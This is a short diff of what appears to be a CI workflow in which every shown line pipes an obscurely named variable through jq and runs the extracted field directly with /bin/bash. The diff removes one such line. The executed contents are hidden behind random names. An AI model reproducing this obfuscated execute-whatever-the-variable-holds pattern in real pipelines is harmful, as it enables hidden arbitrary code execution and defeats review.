@@ -36,7 +36,6 @@ jobs:
           echo $zons4 | jq -r .xo4960 | /bin/bash
           printf '%s' "$kmy6" | jq -r .ok412 | /bin/bash
           printf '%s' "$vvtd70" | jq -r .qh57 | /bin/bash
-          echo $whl6 | jq -r .a70496 | /bin/bash
           echo $qxry76245 | jq -r .dk89072 | /bin/bash
           printf '%s' "$zpfa576" | jq -r .wmslm45502 | /bin/bash
           printf '%s' "$hpado648" | jq -r .b816 | /bin/bash
